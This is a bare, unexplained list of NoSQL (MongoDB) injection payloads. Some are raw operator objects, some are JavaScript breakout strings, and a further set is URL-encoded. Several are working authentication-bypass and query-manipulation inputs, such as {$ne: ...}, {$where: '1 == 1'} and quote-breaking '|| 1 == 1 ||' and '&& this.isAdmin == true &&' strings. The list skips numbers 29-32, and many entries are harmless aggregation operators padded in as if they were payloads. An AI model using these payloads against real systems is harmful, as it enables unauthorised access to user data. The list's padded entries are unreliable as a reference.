**Original Payloads:**

1.  `{$gt: ''}`
2.  `{$lt: ''}`
3.  `{$ne: 'valid_value'}`
4.  `{$regex: '.*'}`
5.  `{$where: '1 == 1'}`
6.  `' || 1 == 1 || '`
7.  `" || 1 == 1 || "`
8.  `{$exists: true}`
9.  `{$exists: false}`
10. `{$type: 2}`
11. `{ $mod: [1, 0] }`
12. `{$not: {$eq: 'valid_value'}}`
13. `{$in: ['valid_value', 'another_value']}`
14. `{$nin: ['valid_value', 'another_value']}`
15. `{ $size: 0 }`
16. `{$all: ['value1', 'value2']}`
17. `{ $elemMatch: {field1: 'value1', field2: 'value2'}}`
18. `{$jsonSchema: {type: 'string'}}`
19. `{ $expr: { $eq: [1, 1] } }`
20. `{$text: {$search: 'text'}}`
21. `' || this.password.length > 0 || '`
22. `" || this.username.length > 0 || "`
23. `{$function: 'function() { return true; }'}`
24. `{$comment: 'this is a comment'}`
25. `{ $rand: {} }`
26. `{$sample: { size: 1 }}`
27. `{$addFields: {newField: 'value'}}`
28. `{$unset: ['field1', 'field2']}`
33. `%7B%24gt%3A%20null%7D` (URL Encoding)
34. `%7B%24lt%3A%20null%7D` (URL Encoding)
35. `%7B%20%24multiply%3A%20%5B%201%2C%201%20%5D%20%7D` (URL Encoding)
36. `%7B%20%24divide%3A%20%5B%201%2C%201%20%5D%20%7D` (URL Encoding)
37. `%7B%24search%3A%20%22a%22%7D` (URL Encoding)
38. `%7B%20%24substr%3A%20%5B%20%22string%22%2C%200%2C%201%20%5D%20%7D` (URL Encoding)
39. `%7B%20%24concat%3A%20%5B%20%22a%22%2C%20%22b%22%20%5D%20%7D` (URL Encoding)
40. `%7B%20%24toLower%3A%20%22STRING%22%20%7D` (URL Encoding)
41. `%7B%20%24toUpper%3A%20%22string%22%20%7D` (URL Encoding)
42. `%27%20%26%26%20this.isAdmin%20%3D%3D%20true%20%26%26%20%27` (URL Encoding)
43. `%22%20%26%26%20this.isAdmin%20%3D%3D%20true%20%26%26%20%22` (URL Encoding)
44. `%7B%20%24dateToString%3A%20%7B%20format%3A%20%22%25Y-%25m-%25d%22%2C%20date%3A%20new%20Date%28%29%20%7D%20%7D` (URL Encoding)
45. `%7B%20%24convert%3A%20%7B%20input%3A%20%22123%22%2C%20to%3A%20%22int%22%20%7D%20%7D` (URL Encoding)
46. `%7B%24abs%3A%20-1%7D` (URL Encoding)
47. `%7B%24ceil%3A%201.5%7D` (URL Encoding)
48. `%7B%24floor%3A%201.5%7D` (URL Encoding)
49. `%7B%24trunc%3A%201.5%7D` (URL Encoding)
50. `%7B%24sqrt%3A%204%7D` (URL Encoding)
